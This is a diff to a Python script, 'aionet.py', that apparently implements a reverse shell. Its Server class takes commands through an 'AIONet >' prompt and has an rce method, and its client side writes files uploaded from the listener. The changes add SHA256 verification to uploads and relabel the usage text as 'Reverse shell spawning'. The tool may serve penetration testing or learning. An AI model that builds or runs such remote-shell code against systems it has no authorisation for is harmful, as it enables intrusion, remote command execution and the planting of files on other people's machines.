@@ -1,5 +1,6 @@
 import argparse
 import base64
+import hashlib
 import os
 import socket
 import subprocess
@@ -31,8 +32,8 @@ class Server:
 			command = input("AIONet > ")
 
 			if command[0:6] == "upload":
-				content = self.upload_file(command)
-				command = bytes(command, "utf-8") + b' ' + content + b'\n'
+				content,chash = self.upload_file(command)
+				command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
 			else:
 				command += "\n"
 
@@ -59,7 +60,13 @@ class Server:
 	def upload_file(self, command):
 		path = command.split(" ")[1]
 		with open(path, "rb") as up_file:
-			return base64.b64encode(up_file.read())
+			content = up_file.read()
+			content_hash = hashlib.sha256(content).hexdigest()
+			if type(content) is not bytes:
+				content = bytes(content, "utf-8")
+			if type(content_hash) is not bytes:
+				content_hash = bytes(content_hash, "utf-8")
+			return base64.b64encode(content), content_hash
 	
 	
 	def rce(self, command):
@@ -73,17 +80,10 @@ class Server:
 			sys.exit(0)
 
 		response = "\n"
-		#while True:
-		#	data = self.connection.recv(4096)
-		#	recv_len = len(data)
-		#	response += data.decode("utf-8")
-		#
-		#	if recv_len < 4096:
-		#		break
-
 		while response[-1] != "\x00":
 			data = self.connection.recv(4096)
 			response += data.decode("utf-8")
+		response.lstrip()
 
 		return response
 
@@ -173,21 +173,31 @@ class Client:
 		split_command = command.split(" ")
 		path = split_command[1]
 		content = split_command[2]
+		chash = split_command[3]
 		try:
 			with open(path,"wb") as out_file:
-				out_file.write(base64.b64decode(content))
-				out_file.close()
-			return f"Uploaded {path}"
-		except:
-			return "Upload failed"
+				dec_content = base64.b64decode(content)
+				whash = hashlib.sha256(dec_content).hexdigest()
+				if chash == whash:
+					out_file.write(dec_content)
+					out_file.close()
+					return f"Uploaded {path}\nSHA256 hash verified:\nReceived: {chash}\nLocal: {whash}\n"
+				else:
+					raise Exception("Hash verification failed.")
+		except Exception as e:
+			return f"Upload failed: {str(e)}\n"
 
 
 def define_args():
-	usage_str = "\nOn host: python3 aionet.py -p PORT -l\nOn remote machine: python3 aionet.py -t TARGET -p PORT"
+	usage_str = """- Reverse shell spawning
+	On host: python3 aionet.py -p PORT -l
+	On remote machine: python3 aionet.py -t TARGET -p PORT"""
 	parser = argparse.ArgumentParser(description="All-In-One Network Utility by Aditya Arole (@e1ora)",usage=usage_str)
 	parser.add_argument("-t","--target",dest="target",type=str,metavar="target",help="IP address of the remote listener")
 	parser.add_argument("-p","--port",dest="port",type=int,metavar="port",help="If used with -l, port where listener is to be created; else, port where remote listener exists")
 	parser.add_argument("-l","--listen",dest="listen",action="store_true",help="Create a listener on the port defined using -p")
+	# parser.add_argument("-s","--scan",dest="scan",action="store_true",help="Port scan a specified target")
+	# parser.add_argument("-r","--range",dest="range",type=str,metavar="port_range",help="Port range to scan (eg: 1-1000)")
 	parser.set_defaults(listen=False)
 
 	if not len(sys.argv) > 1:
